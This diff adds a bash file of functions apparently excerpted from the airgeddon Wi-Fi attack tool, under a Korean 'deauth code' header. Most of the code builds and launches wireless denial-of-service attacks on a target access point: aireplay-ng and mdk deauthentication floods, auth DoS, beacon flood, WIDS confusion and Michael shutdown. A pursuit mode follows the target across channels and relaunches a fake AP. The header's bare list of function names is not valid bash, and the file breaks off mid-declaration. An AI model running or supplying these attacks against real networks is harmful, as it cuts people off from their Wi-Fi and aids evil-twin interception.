@@ -1,0 +1,986 @@
+
+# ========================
+# deauth 코드
+#
+#
+#
+# 함수 목록
+# ========================
+exec_et_deauth()
+launch_dos_pursuit_mode_attack() 
+get_tmux_process_id()       
+pid_control_pursuit_mode()  
+manage_output()       
+prepare_et_monitor()      
+recalculate_windows_sizes()  
+debug_print()  
+language_strings_handling_messages() 
+kill_dos_pursuit_mode_processes()
+kill_pid_and_children_recursive()
+launch_fake_ap()
+set_spoofed_mac()
+start_tmux_processes()
+disable_rfkill()
+detect_screen_resolution()
+set_windows_sizes()
+set_xsizes()
+set_ypositions()
+set_ysizes()
+
+
+function exec_et_deauth() {
+
+	debug_print
+
+	prepare_et_monitor
+
+	case ${et_dos_attack} in
+		"${mdk_command}")
+			rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
+			echo "${bssid}" > "${tmpdir}bl.txt"
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+		;;
+		"Aireplay")
+			deauth_et_cmd="aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${iface_monitor_et_deauth}"
+		;;
+		"Auth DoS")
+			deauth_et_cmd="${mdk_command} ${iface_monitor_et_deauth} a -a ${bssid} -m"
+		;;
+	esac
+
+	recalculate_windows_sizes
+	if [ -n "${enterprise_mode}" ]; then
+		deauth_scr_window_position=${g1_bottomleft_window}
+	else
+		case ${et_mode} in
+			"et_onlyap")
+				deauth_scr_window_position=${g1_bottomright_window}
+			;;
+			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
+				deauth_scr_window_position=${g3_bottomleft_window}
+			;;
+			"et_sniffing_sslstrip2")
+				deauth_scr_window_position=${g4_bottomleft_window}
+			;;
+		esac
+	fi
+
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
+			dos_pursuit_mode_pids=()
+		fi
+		launch_dos_pursuit_mode_attack "${et_dos_attack}" "first_time"
+		pid_control_pursuit_mode "${et_dos_attack}" &
+	else
+		manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth\"" "${deauth_et_cmd}" "Deauth"
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+			et_processes+=($!)
+		else
+			get_tmux_process_id "${deauth_et_cmd}"
+			et_processes+=("${global_process_pid}")
+			global_process_pid=""
+		fi
+
+		sleep 1
+	fi
+}
+
+
+
+
+
+
+
+
+function launch_dos_pursuit_mode_attack() {
+
+	debug_print
+
+	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
+	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
+	rm -rf "${tmpdir}clts.csv" > /dev/null 2>&1
+	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
+
+	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
+		if [[ -z "${enterprise_mode}" ]] && [[ -z "${et_mode}" ]]; then
+			echo
+			language_strings "${language}" 707 "yellow"
+		else
+			echo
+			language_strings "${language}" 507 "yellow"
+		fi
+	fi
+
+	recalculate_windows_sizes
+	case "${1}" in
+		"${mdk_command} amok attack")
+			dos_delay=1
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+		"aireplay deauth attack")
+			dos_delay=3
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+		"auth dos attack")
+			dos_delay=1
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+		"beacon flood attack")
+			dos_delay=1
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n '${essid}' -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+		"wids / wips / wds confusion attack")
+			dos_delay=10
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e '${essid}' -c ${channel}" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+		"michael shutdown attack")
+			dos_delay=1
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+		"${mdk_command}")
+			dos_delay=1
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+		"Aireplay")
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			dos_delay=3
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+		"Auth DoS")
+			dos_delay=10
+			interface_pursuit_mode_scan="${secondary_wifi_interface}"
+			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
+			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
+				dos_pursuit_mode_attack_pid="${global_process_pid}"
+				global_process_pid=""
+			fi
+		;;
+	esac
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		dos_pursuit_mode_attack_pid=$!
+	fi
+	dos_pursuit_mode_pids+=("${dos_pursuit_mode_attack_pid}")
+
+	if [ "${channel}" -gt 14 ]; then
+		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
+			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
+				echo
+				language_strings "${language}" 515 "red"
+				kill_dos_pursuit_mode_processes
+				language_strings "${language}" 115 "read"
+				return 1
+			else
+				airodump_band_modifier="abg"
+			fi
+		else
+			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
+				echo
+				language_strings "${language}" 515 "red"
+				kill_dos_pursuit_mode_processes
+				language_strings "${language}" 115 "read"
+				return 1
+			else
+				airodump_band_modifier="abg"
+			fi
+		fi
+	else
+		if [ "${interface_pursuit_mode_scan}" = "${interface}" ]; then
+			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
+				airodump_band_modifier="bg"
+			else
+				airodump_band_modifier="abg"
+			fi
+		else
+			if [ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
+				airodump_band_modifier="bg"
+			else
+				airodump_band_modifier="abg"
+			fi
+		fi
+	fi
+
+	sleep "${dos_delay}"
+	airodump-ng -w "${tmpdir}dos_pm" "${interface_pursuit_mode_scan}" --band "${airodump_band_modifier}" > /dev/null 2>&1 &
+	dos_pursuit_mode_scan_pid=$!
+	dos_pursuit_mode_pids+=("${dos_pursuit_mode_scan_pid}")
+
+	if [[ -n "${2}" ]] && [[ "${2}" = "relaunch" ]]; then
+		if [[ -n "${enterprise_mode}" ]] || [[ -n "${et_mode}" ]]; then
+			launch_fake_ap
+		fi
+	fi
+
+	local processes_file
+	processes_file="${tmpdir}${et_processesfile}"
+	for item in "${dos_pursuit_mode_pids[@]}"; do
+		echo "${item}" >> "${processes_file}"
+	done
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function get_tmux_process_id() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+
+		local process_cmd_line
+		local process_pid
+
+		process_cmd_line=$(echo "${1}" | tr -d '"')
+		while [ -z "${process_pid}" ]; do
+			process_pid=$(ps --no-headers aux | grep "${process_cmd_line}" | grep -v "grep ${process_cmd_line}" | awk '{print $2}')
+		done
+		global_process_pid="${process_pid}"
+	fi
+}
+
+
+
+
+
+pid_control_pursuit_mode() {
+
+	debug_print
+
+	local dos_pursuit_mode_ignored_channel=""
+
+	rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
+	echo "${channel}" > "${tmpdir}${channelfile}"
+
+	while true; do
+		sleep 5
+		if grep "${bssid}" "${tmpdir}dos_pm-01.csv" > /dev/null 2>&1; then
+			readarray -t DOS_PM_LINES_TO_PARSE < <(cat < "${tmpdir}dos_pm-01.csv" 2> /dev/null)
+
+			for item in "${DOS_PM_LINES_TO_PARSE[@]}"; do
+				if [[ "${item}" =~ ${bssid} ]]; then
+					dos_pm_current_channel=$(echo "${item}" | awk -F "," '{print $4}' | sed 's/^[ ^t]*//')
+
+					if [[ "${dos_pm_current_channel}" =~ ^([0-9]+)$ ]] && [[ "${BASH_REMATCH[1]}" -ne 0 ]] && [[ "${BASH_REMATCH[1]}" -ne "${channel}" ]]; then
+						if [[ "${dos_pm_current_channel}" -gt 14 ]] && [[ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
+							if [ "${dos_pursuit_mode_ignored_channel}" != "${dos_pm_current_channel}" ]; then
+								echo
+								language_strings "${language}" 813 "yellow"
+								dos_pursuit_mode_ignored_channel="${dos_pm_current_channel}"
+							fi
+							continue
+						fi
+
+						dos_pursuit_mode_ignored_channel=""
+						channel="${dos_pm_current_channel}"
+						rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
+						echo "${channel}" > "${tmpdir}${channelfile}"
+
+						if [ -n "${enterprise_mode}" ]; then
+							sed -ri "s:(channel)=([0-9]{1,3}):\1=${channel}:" "${tmpdir}${hostapd_wpe_file}" 2> /dev/null
+						elif [ -n "${et_mode}" ]; then
+							sed -ri "s:(channel)=([0-9]{1,3}):\1=${channel}:" "${tmpdir}${hostapd_file}" 2> /dev/null
+						fi
+
+						kill_dos_pursuit_mode_processes
+						launch_dos_pursuit_mode_attack "${1}" "relaunch"
+					fi
+				fi
+			done
+		fi
+
+		dos_attack_alive=$(ps uax | awk '{print $2}' | grep -E "^${dos_pursuit_mode_attack_pid}$" 2> /dev/null)
+		if [ -z "${dos_attack_alive}" ]; then
+			break
+		fi
+	done
+
+	kill_dos_pursuit_mode_processes
+}
+
+
+
+
+
+
+
+function manage_output() {
+
+	debug_print
+
+	local xterm_parameters
+	local tmux_command_line
+	local xterm_command_line
+	local window_name
+	local command_tail
+
+	xterm_parameters="${1}"
+	tmux_command_line="${2}"
+	xterm_command_line="\"${2}\""
+	window_name="${3}"
+	command_tail=" > /dev/null 2>&1 &"
+
+	case "${AIRGEDDON_WINDOWS_HANDLING}" in
+		"tmux")
+			local tmux_color
+			tmux_color=""
+			[[ "${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="${BASH_REMATCH[2]}"
+			case "${4}" in
+				"active")
+					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}" "active"
+				;;
+				*)
+					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}"
+				;;
+			esac
+		;;
+		"xterm")
+			eval "xterm ${xterm_parameters} -e ${xterm_command_line}${command_tail}"
+		;;
+	esac
+}
+
+
+
+
+
+function prepare_et_monitor() {
+
+	debug_print
+
+	disable_rfkill
+
+	iface_phy_number=${phy_interface:3:1}
+	iface_monitor_et_deauth="mon${iface_phy_number}"
+
+	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
+	iw phy "${phy_interface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
+	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
+}
+
+
+
+
+
+
+function recalculate_windows_sizes() {
+
+	debug_print
+
+	detect_screen_resolution
+	set_windows_sizes
+}
+
+
+
+
+
+
+
+
+
+
+function debug_print() {
+
+	if "${AIRGEDDON_DEBUG_MODE:-true}"; then
+
+		declare excluded_functions=(
+							"airmon_fix"
+							"ask_yesno"
+							"check_pending_of_translation"
+							"clean_env_vars"
+							"contains_element"
+							"create_instance_orchestrator_file"
+							"create_rcfile"
+							"echo_blue"
+							"echo_brown"
+							"echo_cyan"
+							"echo_green"
+							"echo_green_title"
+							"echo_pink"
+							"echo_red"
+							"echo_red_slim"
+							"echo_white"
+							"echo_yellow"
+							"env_vars_initialization"
+							"env_vars_values_validation"
+							"fix_autocomplete_chars"
+							"flying_saucer"
+							"generate_dynamic_line"
+							"initialize_colors"
+							"initialize_instance_settings"
+							"initialize_script_settings"
+							"instance_setter"
+							"interrupt_checkpoint"
+							"language_strings"
+							"last_echo"
+							"physical_interface_finder"
+							"print_hint"
+							"print_large_separator"
+							"print_simple_separator"
+							"read_yesno"
+							"register_instance_pid"
+							"remove_warnings"
+							"set_absolute_path"
+							"set_script_paths"
+							"special_text_missed_optional_tool"
+							"store_array"
+							"under_construction_message"
+						)
+
+		if (IFS=$'\n'; echo "${excluded_functions[*]}") | grep -qFx "${FUNCNAME[1]}"; then
+			return 1
+		fi
+
+		echo "Line:${BASH_LINENO[1]}" "${FUNCNAME[1]}"
+	fi
+
+	return 0
+}
+
+
+
+
+
+
+
+
+
+
+
+function language_strings_handling_messages() {
+
+	declare -gA language_strings_no_file
+	language_strings_no_file["ENGLISH"]="Error. Language strings file not found"
+	language_strings_no_file["SPANISH"]="Error. No se ha encontrado el fichero de traducciones"
+	language_strings_no_file["FRENCH"]="Erreur. Fichier contenant les traductions absent"
+	language_strings_no_file["CATALAN"]="Error. No s'ha trobat el fitxer de traduccions"
+	language_strings_no_file["PORTUGUESE"]="Erro. O arquivo de tradução não foi encontrado"
+	language_strings_no_file["RUSSIAN"]="Ошибка. Не найден языковой файл"
+	language_strings_no_file["GREEK"]="Σφάλμα. Το αρχείο γλωσσών δεν βρέθηκε"
+	language_strings_no_file["ITALIAN"]="Errore. Non si trova il file delle traduzioni"
+	language_strings_no_file["POLISH"]="Błąd. Nie znaleziono pliku tłumaczenia"
+	language_strings_no_file["GERMAN"]="Fehler. Die Übersetzungsdatei wurde nicht gefunden"
+	language_strings_no_file["TURKISH"]="Hata. Çeviri dosyası bulunamadı"
+	language_strings_no_file["ARABIC"]="خطأ. ملف اللغة غير موجود"
+	language_strings_no_file["CHINESE"]="错误。未找到语言支持文件"
+
+	declare -gA language_strings_file_mismatch
+	language_strings_file_mismatch["ENGLISH"]="Error. The language strings file found mismatches expected version"
+	language_strings_file_mismatch["SPANISH"]="Error. El fichero de traducciones encontrado no es la versión esperada"
+	language_strings_file_mismatch["FRENCH"]="Erreur. Les traductions trouvées ne sont pas celles attendues"
+	language_strings_file_mismatch["CATALAN"]="Error. El fitxer de traduccions trobat no és la versió esperada"
+	language_strings_file_mismatch["PORTUGUESE"]="Erro. O a versão do arquivos de tradução encontrado é a incompatível"
+	language_strings_file_mismatch["RUSSIAN"]="Ошибка. Языковой файл не соответствует ожидаемой версии"
+	language_strings_file_mismatch["GREEK"]="Σφάλμα. Το αρχείο γλωσσών που έχει βρεθεί δεν αντιστοιχεί με την προαπαιτούμενη έκδοση"
+	language_strings_file_mismatch["ITALIAN"]="Errore. Il file delle traduzioni trovato non è la versione prevista"
+	language_strings_file_mismatch["POLISH"]="Błąd. Znaleziony plik tłumaczenia nie jest oczekiwaną wersją"
+	language_strings_file_mismatch["GERMAN"]="Fehler. Die gefundene Übersetzungsdatei ist nicht die erwartete Version"
+	language_strings_file_mismatch["TURKISH"]="Hata. Bulunan çeviri dosyası beklenen sürüm değil"
+	language_strings_file_mismatch["ARABIC"]="خطأ. ملف اللغة غيرمتطابق مع الإصدار المتوقع"
+	language_strings_file_mismatch["CHINESE"]="错误。发现语言支持文件与预期版本不匹配"
+
+	declare -gA language_strings_try_to_download
+	language_strings_try_to_download["ENGLISH"]="airgeddon will try to download the language strings file..."
+	language_strings_try_to_download["SPANISH"]="airgeddon intentará descargar el fichero de traducciones..."
+	language_strings_try_to_download["FRENCH"]="airgeddon va essayer de télécharger les fichiers de traductions..."
+	language_strings_try_to_download["CATALAN"]="airgeddon intentarà descarregar el fitxer de traduccions..."
+	language_strings_try_to_download["PORTUGUESE"]="O airgeddon tentará baixar o arquivo de tradução..."
+	language_strings_try_to_download["RUSSIAN"]="airgeddon попытается загрузить языковой файл..."
+	language_strings_try_to_download["GREEK"]="Το airgeddon θα προσπαθήσει να κατεβάσει το αρχείο γλωσσών..."
+	language_strings_try_to_download["ITALIAN"]="airgeddon cercherá di scaricare il file delle traduzioni..."
+	language_strings_try_to_download["POLISH"]="airgeddon spróbuje pobrać plik tłumaczeń..."
+	language_strings_try_to_download["GERMAN"]="airgeddon wird versuchen, die Übersetzungsdatei herunterzuladen..."
+	language_strings_try_to_download["TURKISH"]="airgeddon çeviri dosyasını indirmeye çalışacak..."
+	language_strings_try_to_download["ARABIC"]="سيحاول airgeddon تنزيل ملف سلاسل اللغة ..."
+	language_strings_try_to_download["CHINESE"]="airgeddon 将尝试下载语言支持文件..."
+
+	declare -gA language_strings_successfully_downloaded
+	language_strings_successfully_downloaded["ENGLISH"]="Language strings file was successfully downloaded"
+	language_strings_successfully_downloaded["SPANISH"]="Se ha descargado con éxito el fichero de traducciones"
+	language_strings_successfully_downloaded["FRENCH"]="Les fichiers traduction ont été correctement téléchargés"
+	language_strings_successfully_downloaded["CATALAN"]="S'ha descarregat amb èxit el fitxer de traduccions"
+	language_strings_successfully_downloaded["PORTUGUESE"]="O arquivo de tradução foi baixado com sucesso"
+	language_strings_successfully_downloaded["RUSSIAN"]="Языковой файл был успешно загружен"
+	language_strings_successfully_downloaded["GREEK"]="Το αρχείο γλωσσών κατέβηκε με επιτυχία"
+	language_strings_successfully_downloaded["ITALIAN"]="Il file delle traduzioni è stato scaricato con successo"
+	language_strings_successfully_downloaded["POLISH"]="Plik z tłumaczeniem został pomyślnie pobrany"
+	language_strings_successfully_downloaded["GERMAN"]="Die Übersetzungsdatei wurde erfolgreich heruntergeladen"
+	language_strings_successfully_downloaded["TURKISH"]="Çeviri dosyası başarıyla indirildi"
+	language_strings_successfully_downloaded["ARABIC"]="تم تنزيل ملف سلاسل اللغة بنجاح"
+	language_strings_successfully_downloaded["CHINESE"]="语言支持文件已成功下载"
+
+	declare -gA language_strings_failed_downloading
+	language_strings_failed_downloading["ENGLISH"]="The language string file can't be downloaded. Check your internet connection or download it manually from ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["SPANISH"]="No se ha podido descargar el fichero de traducciones. Comprueba tu conexión a internet o descárgalo manualmente de ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["FRENCH"]="Impossible de télécharger le fichier traduction. Vérifiez votre connexion à internet ou téléchargez le fichier manuellement ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["CATALAN"]="No s'ha pogut descarregar el fitxer de traduccions. Comprova la connexió a internet o descarrega'l manualment de ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["PORTUGUESE"]="Não foi possível baixar o arquivos de tradução. Verifique a sua conexão com a internet ou baixe manualmente em ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["RUSSIAN"]="Языковой файл не может быть загружен. Проверьте подключение к Интернету или загрузите его вручную с ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["GREEK"]="Το αρχείο γλωσσών δεν μπορεί να κατέβει. Ελέγξτε τη σύνδεση σας με το διαδίκτυο ή κατεβάστε το χειροκίνητα ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["ITALIAN"]="Impossibile scaricare il file delle traduzioni. Controlla la tua connessione a internet o scaricalo manualmente ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["POLISH"]="Nie można pobrać pliku tłumaczenia. Sprawdź połączenie internetowe lub pobierz go ręcznie z ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["GERMAN"]="Die Übersetzungsdatei konnte nicht heruntergeladen werden. Überprüfen Sie Ihre Internetverbindung oder laden Sie sie manuell von ${normal_color}${urlgithub} runter"
+	language_strings_failed_downloading["TURKISH"]="Çeviri dosyası indirilemedi. İnternet bağlantınızı kontrol edin veya manuel olarak indirin ${normal_color}${urlgithub}"
+	language_strings_failed_downloading["ARABIC"]="${normal_color}${urlgithub}${red_color} لا يمكن تنزيل ملف اللغة. تحقق من اتصالك بالإنترنت أو قم بتنزيله يدويًا من"
+	language_strings_failed_downloading["CHINESE"]="无法下载语言支持文件。检查您的互联网连接或从 手动下载 ${normal_color}${urlgithub}"
+
+	declare -gA language_strings_first_time
+	language_strings_first_time["ENGLISH"]="If you are seeing this message after an automatic update, don't be scared! It's probably because airgeddon has different file structure since version 6.1. It will be automatically fixed"
+	language_strings_first_time["SPANISH"]="Si estás viendo este mensaje tras una actualización automática, ¡no te asustes! probablemente es porque a partir de la versión 6.1 la estructura de ficheros de airgeddon ha cambiado. Se reparará automáticamente"
+	language_strings_first_time["FRENCH"]="Si vous voyez ce message après une mise à jour automatique ne vous inquiétez pas! A partir de la version 6.1 la structure de fichier d'airgeddon a changé. L'ajustement se fera automatiquement"
+	language_strings_first_time["CATALAN"]="Si estàs veient aquest missatge després d'una actualització automàtica, no t'espantis! probablement és perquè a partir de la versió 6.1 l'estructura de fitxers de airgeddon ha canviat. Es repararà automàticament"
+	language_strings_first_time["PORTUGUESE"]="Se você está vendo esta mensagem depois de uma atualização automática, não tenha medo! A partir da versão 6.1 da estrutura de arquivos do airgeddon mudou. Isso será corrigido automaticamente"
+	language_strings_first_time["RUSSIAN"]="Если вы видите это сообщение после автоматического обновления, не переживайте! Вероятно, это объясняется тем, что, начиная с версии 6.1, airgeddon имеет другую структуру файлов. Проблема будет разрешена автоматически"
+	language_strings_first_time["GREEK"]="Εάν βλέπετε αυτό το μήνυμα μετά από κάποια αυτόματη ενημέρωση, μην τρομάξετε! Πιθανόν είναι λόγω της διαφορετικής δομής του airgeddon μετά από την έκδοση 6.1. Θα επιδιορθωθεί αυτόματα"
+	language_strings_first_time["ITALIAN"]="Se stai vedendo questo messaggio dopo un aggiornamento automatico, niente panico! probabilmente è perché a partire dalla versione 6.1 é cambiata la struttura dei file di airgeddon. Sarà riparato automaticamente"
+	language_strings_first_time["POLISH"]="Jeśli widzisz tę wiadomość po automatycznej aktualizacji, nie obawiaj się! To prawdopodobnie dlatego, że w wersji 6.1 zmieniła się struktura plików airgeddon. Naprawi się automatycznie"
+	language_strings_first_time["GERMAN"]="Wenn Sie diese Nachricht nach einem automatischen Update sehen, haben Sie keine Angst! Das liegt vermutlich daran, dass ab Version 6.1 die Dateistruktur von airgeddon geändert wurde. Es wird automatisch repariert"
+	language_strings_first_time["TURKISH"]="Otomatik bir güncellemeden sonra bu mesajı görüyorsanız, korkmayın! muhtemelen 6.1 sürümünden itibaren airgeddon dosya yapısı değişmiştir. Otomatik olarak tamir edilecektir"
+	language_strings_first_time["ARABIC"]="إذا كنت ترى هذه الرسالة بعد التحديث التلقائي ، فلا تخف! ربما يرجع السبب في ذلك إلى أن airgeddon له بنية ملفات مختلفة منذ الإصدار 6.1. سيتم إصلاحه تلقائيًا "
+	language_strings_first_time["CHINESE"]="如果您在自动更新后看到此消息，请不要害怕！这可能是因为 airgeddon 从 6.1 版本开始有不同的文件结构。会自动修复"
+
+	declare -gA language_strings_exiting
+	language_strings_exiting["ENGLISH"]="Exiting airgeddon script v${airgeddon_version} - See you soon! :)"
+	language_strings_exiting["SPANISH"]="Saliendo de airgeddon script v${airgeddon_version} - Nos vemos pronto! :)"
+	language_strings_exiting["FRENCH"]="Fermeture du script airgeddon v${airgeddon_version} - A bientôt! :)"
+	language_strings_exiting["CATALAN"]="Sortint de airgeddon script v${airgeddon_version} - Ens veiem aviat! :)"
+	language_strings_exiting["PORTUGUESE"]="Saindo do script airgeddon v${airgeddon_version} - Até breve! :)"
+	language_strings_exiting["RUSSIAN"]="Выход из скрипта airgeddon v${airgeddon_version} - До встречи! :)"
+	language_strings_exiting["GREEK"]="Κλείσιμο του airgeddon v${airgeddon_version} - Αντίο :)"
+	language_strings_exiting["ITALIAN"]="Uscendo dallo script airgeddon v${airgeddon_version} - A presto! :)"
+	language_strings_exiting["POLISH"]="Wyjście z skryptu airgeddon v${airgeddon_version} - Do zobaczenia wkrótce! :)"
+	language_strings_exiting["GERMAN"]="Sie verlassen airgeddon v${airgeddon_version} - Bis bald! :)"
+	language_strings_exiting["TURKISH"]="airgeddon yazılımından çıkış yapılıyor v${airgeddon_version} - Yakında görüşürüz! :)"
+	language_strings_exiting["ARABIC"]="الخروج من البرنامج airgeddon v${airgeddon_version}- نراكم قريبًا! :)"
+	language_strings_exiting["CHINESE"]="退出 airgeddon 脚本 v${airgeddon_version} - 待会见！ :)"
+
+	declare -gA language_strings_key_to_continue
